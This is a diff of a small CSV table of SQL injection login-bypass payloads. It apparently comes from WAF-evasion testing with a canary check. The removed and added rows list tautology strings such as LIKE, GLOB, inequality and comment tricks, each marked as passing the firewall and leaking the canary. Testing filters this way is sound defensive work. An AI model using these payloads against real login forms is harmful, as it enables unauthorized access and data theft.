@@ -1,5 +1,6 @@
-bypass_payload,technique,waf_passed,leaks_canary_real_sink,genuine_bypass
-admin' OR 'a' LIKE 'a ,"LIKE tautology: no '=' , no '--'",True,True,True
-admin' OR 'x'<>'y,"'<>' inequality is always true, evades the '=' rules",True,True,True
-admin'/**/OR/**/'a'='a,inline /**/ comment defeats the rule's \bor\b\s+ anchor,True,True,True
-admin'/**/oR/**/'1'='1,mixed case + /**/ comment: classic tautology still slips the rule,True,True,True
+payload,technique,waf_passed,leaks_canary,genuine_bypass
+admin'/* :: */ AND '1'='1,block-comment neutralization + quoted tautology,True,True,True
+admin'/* :: */ AND pw GLOB '*,block-comment + GLOB wildcard (no '='),True,True,True
+admin'/* :: */ AND 2>1 AND 'a'<'z,block-comment + inequality tautology,True,True,True
+admin'/* :: */ AND 'a'='a,block-comment + quoted equality (no OR keyword),True,True,True
+admin'/* :: */ AND pw LIKE '%,block-comment + LIKE wildcard,True,True,True
